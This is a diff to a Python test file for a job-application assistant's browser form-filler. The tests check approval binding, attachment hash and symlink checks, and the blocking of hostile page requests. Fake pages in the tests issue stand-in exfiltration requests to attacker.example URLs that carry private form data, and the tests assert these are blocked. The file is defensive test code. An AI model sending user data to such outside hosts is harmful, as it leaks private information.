@@ -1,6 +1,9 @@
 from __future__ import annotations
 
 import asyncio
+import hashlib
+import inspect
+import os
 import sqlite3
 import sys
 import types
@@ -21,8 +24,10 @@ from career_companion.backup import create_backup, restore_backup
 from career_companion.database import ApplicationRecord, ArtifactRecord, JobRecord
 from career_companion.paths import CompanionPaths
 from career_companion.persistence import clear_factory_cache, session_factory_for
+from career_companion.services import browser as browser_service
 from career_companion.services.approvals import decide_approval, request_approval
 from career_companion.services.browser import BrowserAssistant
+from career_companion.services.form_fill import FormFillRequestError
 from career_companion.services.rendering import (
     render_one_page,
     validate_pdf,
@@ -184,26 +189,56 @@ def test_restore_rejects_paths_outside_the_backup_contract(tmp_path) -> None:
         restore_backup(CompanionPaths.at_root(tmp_path / "target"), malicious)
 
 
-class _FakeLocator:
-    def __init__(self, metadata, interactions, selector):
+class _FakeElement:
+    def __init__(self, metadata):
         self.metadata = metadata
-        self.interactions = interactions
+        self.connected = True
+
+
+class _FakeElementHandle:
+    def __init__(self, element, page, selector):
+        self.element = element
+        self.page = page
+        self.selector = selector
+
+    async def evaluate(self, script, argument=None):
+        if "element === current" in script:
+            return (
+                self.element.connected
+                and isinstance(argument, _FakeElementHandle)
+                and self.element is argument.element
+            )
+        return self.element.metadata
+
+    async def fill(self, value):
+        self.page.interactions.append(("fill", self.selector, value))
+        await self.page.after_interaction("fill", self.selector, value)
+
+    async def select_option(self, value):
+        self.page.interactions.append(("select", self.selector, value))
+        await self.page.after_interaction("select", self.selector, value)
+
+    async def set_input_files(self, value):
+        self.page.interactions.append(("file", self.selector, value))
+        await self.page.after_interaction("file", self.selector, value)
+
+    async def dispose(self):
+        return None
+
+
+class _FakeLocator:
+    def __init__(self, page, selector):
+        self.page = page
         self.selector = selector
 
     async def count(self):
-        return 1
+        return int(self.selector in self.page.controls)
 
-    async def evaluate(self, _script):
-        return self.metadata
-
-    async def fill(self, value):
-        self.interactions.append(("fill", self.selector, value))
-
-    async def select_option(self, value):
-        self.interactions.append(("select", self.selector, value))
-
-    async def set_input_files(self, value):
-        self.interactions.append(("file", self.selector, value))
+    async def element_handle(self):
+        element = self.page.controls.get(self.selector)
+        if element is None:
+            return None
+        return _FakeElementHandle(element, self.page, self.selector)
 
 
 class _FakePage:
@@ -212,17 +247,23 @@ class _FakePage:
         controls,
         redirect_url="https://jobs.example.test/apply",
         on_goto=None,
+        on_interaction=None,
     ):
-        self.controls = controls
+        self.controls = {
+            selector: _FakeElement(metadata) for selector, metadata in controls.items()
+        }
         self.url = "about:blank"
         self.redirect_url = redirect_url
         self.on_goto = on_goto
+        self.on_interaction = on_interaction
         self.interactions = []
         self.guards = []
         self.init_scripts = []
         self.routes = []
         self.web_socket_routes = []
         self.launch_options = {}
+        self.requests_reaching_server = []
+        self.blocked_requests = []
 
     async def goto(self, _url, **_kwargs):
         if self.on_goto is not None:
@@ -232,6 +273,22 @@ class _FakePage:
     async def evaluate(self, script):
         self.guards.append(script)
 
+    async def after_interaction(self, kind, selector, value):
+        if self.on_interaction is None:
+            return
+        result = self.on_interaction(self, kind, selector, value)
+        if inspect.isawaitable(result):
+            await result
+
+    async def dispatch_request(self, method, url):
+        route = _HostileRoute()
+        request = _HostileRequest(method=method, url=url)
+        await self.routes[-1][1](route, request)
+        if route.continued:
+            self.requests_reaching_server.append((method, url))
+        else:
+            self.blocked_requests.append((method, url))
+
     async def route(self, pattern, handler):
         self.routes.append((pattern, handler))
 
@@ -239,12 +296,33 @@ class _FakePage:
         self.routes.remove((pattern, handler))
 
     def locator(self, selector):
-        return _FakeLocator(self.controls[selector], self.interactions, selector)
+        return _FakeLocator(self, selector)
+
+    def replace_control(self, selector, metadata):
+        current = self.controls.get(selector)
+        if current is not None:
+            current.connected = False
+        self.controls[selector] = _FakeElement(metadata)
 
 
 class _HostileRequest:
-    method = "POST"
-    url = "https://jobs.example.test/collect"
+    resource_type = "fetch"
+
+    def __init__(
+        self,
+        method="POST",
+        url="https://jobs.example.test/collect",
+        *,
+        navigation=False,
+        resource_type="fetch",
+    ) -> None:
+        self.method = method
+        self.url = url
+        self._navigation = navigation
+        self.resource_type = resource_type
+
+    def is_navigation_request(self):
+        return self._navigation
 
 
 class _HostileRoute:
@@ -287,6 +365,19 @@ class _HostilePage(_FakePage):
             self.blocked_during_navigation.append("fetch-post")
         else:
             self.mutations_reaching_server.append("fetch-post")
+        cross_origin_route = _HostileRoute()
+        if self.routes:
+            await self.routes[-1][1](
+                cross_origin_route,
+                _HostileRequest(
+                    method="GET",
+                    url="https://attacker.example/startup-collect",
+                ),
+            )
+        if cross_origin_route.aborted:
+            self.blocked_during_navigation.append("cross-origin-get")
+        else:
+            self.mutations_reaching_server.append("cross-origin-get")
         web_socket = _HostileWebSocket()
         if self.web_socket_routes:
             await self.web_socket_routes[-1][1](web_socket)
@@ -373,6 +464,22 @@ def _approve(session, paths, payload):
     )
     decide_approval(session, approval.id, "approved")
     return approval
+
+
+def _approved_artifact(session, paths, application, content=b"approved"):
+    attachment = paths.workspace / "approved-cv.pdf"
+    attachment.write_bytes(content)
+    artifact = ArtifactRecord(
+        application_id=application.id,
+        kind="cv",
+        version=1,
+        path=str(attachment),
+        sha256=hashlib.sha256(content).hexdigest(),
+        approved=True,
+    )
+    session.add(artifact)
+    session.flush()
+    return attachment, artifact
 
 
 def test_browser_fill_checks_element_semantics_and_never_submits(
@@ -471,7 +578,11 @@ def test_browser_boundaries_exist_before_hostile_document_startup(
     assert page.launch_options["service_workers"] == "block"
     assert page.init_guard_present_at_navigation is True
     assert page.mutations_reaching_server == []
-    assert page.blocked_during_navigation == ["fetch-post", "websocket"]
+    assert page.blocked_during_navigation == [
+        "fetch-post",
+        "cross-origin-get",
+        "websocket",
+    ]
     assert page.routes == []
     assert approval.decision == "approved"
 
@@ -516,27 +627,20 @@ def test_browser_rejects_a_different_safe_redirect_without_consuming(
     assert page.interactions == []
 
 
-def test_browser_url_binding_ignores_fragments_but_not_the_destination(
+@pytest.mark.parametrize("fragment", ["review", "different"])
+def test_browser_url_binding_rejects_fragments_before_launch(
     browser_session,
-    monkeypatch,
+    fragment,
 ) -> None:
     paths, session, application = browser_session
     payload = {
         "application_id": application.id,
-        "url": "HTTPS://JOBS.EXAMPLE.TEST:443/apply#approved-step",
+        "url": f"https://jobs.example.test/apply#{fragment}",
         "fields": {"#name": "Ada"},
     }
-    approval = _approve(session, paths, payload)
-    page = _FakePage(
-        {"#name": {"tag": "input", "type": "text", "disabled": False}},
-        redirect_url="https://jobs.example.test/apply#runtime-step",
-    )
-    _install_fake_playwright(monkeypatch, page)
 
-    result = asyncio.run(BrowserAssistant(paths).fill(session, payload))
-
-    assert result["controls"] == ["#name"]
-    assert approval.decision == "consumed"
+    with pytest.raises(FormFillRequestError, match="strict schema"):
+        _approve(session, paths, payload)
 
 
 def test_missing_browser_runtime_does_not_consume_approval(
@@ -565,18 +669,7 @@ def test_browser_final_attachment_validation_precedes_consumption(
     change,
 ) -> None:
     paths, session, application = browser_session
-    attachment = paths.workspace / "approved-cv.pdf"
-    attachment.write_bytes(b"approved")
-    artifact = ArtifactRecord(
-        application_id=application.id,
-        kind="cv",
-        version=1,
-        path=str(attachment),
-        sha256="a" * 64,
-        approved=True,
-    )
-    session.add(artifact)
-    session.flush()
+    attachment, artifact = _approved_artifact(session, paths, application)
     payload = {
         "application_id": application.id,
         "url": "https://jobs.example.test/apply",
@@ -602,3 +695,190 @@ def test_browser_final_attachment_validation_precedes_consumption(
 
     assert approval.decision == "approved"
     assert page.interactions == []
+
+
+def test_browser_rejects_same_size_attachment_overwrite_without_consuming(
+    browser_session,
+) -> None:
+    paths, session, application = browser_session
+    attachment, artifact = _approved_artifact(
+        session,
+        paths,
+        application,
+        content=b"approved",
+    )
+    payload = {
+        "application_id": application.id,
+        "url": "https://jobs.example.test/apply",
+        "files": {"#resume": artifact.id},
+    }
+    approval = _approve(session, paths, payload)
+    original = attachment.stat()
+    attachment.write_bytes(b"tampered")
+    os.utime(attachment, ns=(original.st_atime_ns, original.st_mtime_ns))
+
+    with pytest.raises(PermissionError, match="stored SHA-256"):
+        asyncio.run(BrowserAssistant(paths).fill(session, payload))
+
+    assert approval.decision == "approved"
+
+
+@pytest.mark.parametrize("replacement", ["oversize", "symlink"])
+def test_browser_rejects_unsafe_attachment_replacements_without_consuming(
+    browser_session,
+    tmp_path,
+    replacement,
+) -> None:
+    paths, session, application = browser_session
+    attachment, artifact = _approved_artifact(session, paths, application)
+    payload = {
+        "application_id": application.id,
+        "url": "https://jobs.example.test/apply",
+        "files": {"#resume": artifact.id},
+    }
+    approval = _approve(session, paths, payload)
+    if replacement == "oversize":
+        with attachment.open("wb") as stream:
+            stream.truncate(20 * 1024 * 1024 + 1)
+    else:
+        outside = tmp_path / "outside.pdf"
+        outside.write_bytes(b"approved")
+        attachment.unlink()
+        try:
+            attachment.symlink_to(outside)
+        except OSError:
+            pytest.skip("Symbolic links are unavailable")
+
+    with pytest.raises(PermissionError, match="read safely"):
+        asyncio.run(BrowserAssistant(paths).fill(session, payload))
+
+    assert approval.decision == "approved"
+
+
+def test_browser_uploads_captured_approved_bytes_after_path_overwrite(
+    browser_session,
+    monkeypatch,
+) -> None:
+    paths, session, application = browser_session
+    approved_bytes = b"approved immutable resume bytes"
+    attachment, artifact = _approved_artifact(
+        session,
+        paths,
+        application,
+        content=approved_bytes,
+    )
+    payload = {
+        "application_id": application.id,
+        "url": "https://jobs.example.test/apply",
+        "files": {"#resume": artifact.id},
+    }
+    approval = _approve(session, paths, payload)
+    page = _FakePage(
+        {"#resume": {"tag": "input", "type": "file", "disabled": False}}
+    )
+    _install_fake_playwright(monkeypatch, page)
+    real_validate = browser_service.validate_form_payload
+    validation_calls = 0
+
+    def overwrite_after_final_validation(*args, **kwargs):
+        nonlocal validation_calls
+        validated = real_validate(*args, **kwargs)
+        validation_calls += 1
+        if validation_calls == 2:
+            attachment.write_bytes(b"post-validation attacker bytes")
+        return validated
+
+    monkeypatch.setattr(
+        browser_service,
+        "validate_form_payload",
+        overwrite_after_final_validation,
+    )
+
+    result = asyncio.run(BrowserAssistant(paths).fill(session, payload))
+
+    assert result["controls"] == ["#resume"]
+    assert approval.decision == "consumed"
+    assert attachment.read_bytes() == b"post-validation attacker bytes"
+    uploaded = page.interactions[0][2]
+    assert uploaded == {
+        "name": "approved-cv.pdf",
+        "mimeType": "application/pdf",
+        "buffer": approved_bytes,
+    }
+    assert hashlib.sha256(uploaded["buffer"]).hexdigest() == artifact.sha256
+
+
+@pytest.mark.parametrize(
+    "exfiltration_url",
+    [
+        "https://attacker.example/collect?private=Ada",
+        "https://jobs.example.test/collect?private=Ada",
+    ],
+)
+def test_browser_freezes_get_exfiltration_and_stops_before_second_field(
+    browser_session,
+    monkeypatch,
+    exfiltration_url,
+) -> None:
+    paths, session, application = browser_session
+    payload = {
+        "application_id": application.id,
+        "url": "https://jobs.example.test/apply",
+        "fields": {"#first": "Ada", "#second": "private@example.test"},
+    }
+    _approve(session, paths, payload)
+
+    async def exfiltrate_and_navigate(page, _kind, selector, _value):
+        if selector == "#first":
+            await page.dispatch_request("GET", exfiltration_url)
+            page.url = "https://attacker.example/stolen"
+
+    page = _FakePage(
+        {
+            "#first": {"tag": "input", "type": "text", "disabled": False},
+            "#second": {"tag": "input", "type": "email", "disabled": False},
+        },
+        on_interaction=exfiltrate_and_navigate,
+    )
+    _install_fake_playwright(monkeypatch, page)
+
+    with pytest.raises(PermissionError, match="exact approved application URL"):
+        asyncio.run(BrowserAssistant(paths).fill(session, payload))
+
+    assert page.interactions == [("fill", "#first", "Ada")]
+    assert page.requests_reaching_server == []
+    assert page.blocked_requests == [("GET", exfiltration_url)]
+
+
+def test_browser_bound_element_identity_blocks_same_selector_replacement(
+    browser_session,
+    monkeypatch,
+) -> None:
+    paths, session, application = browser_session
+    payload = {
+        "application_id": application.id,
+        "url": "https://jobs.example.test/apply",
+        "fields": {"#first": "Ada", "#second": "private@example.test"},
+    }
+    _approve(session, paths, payload)
+
+    def replace_second(page, _kind, selector, _value):
+        if selector == "#first":
+            page.replace_control(
+                "#second",
+                {"tag": "input", "type": "email", "disabled": False},
+            )
+
+    page = _FakePage(
+        {
+            "#first": {"tag": "input", "type": "text", "disabled": False},
+            "#second": {"tag": "input", "type": "email", "disabled": False},
+        },
+        on_interaction=replace_second,
+    )
+    _install_fake_playwright(monkeypatch, page)
+
+    with pytest.raises(PermissionError, match="detached or replaced"):
+        asyncio.run(BrowserAssistant(paths).fill(session, payload))
+
+    assert page.interactions == [("fill", "#first", "Ada")]
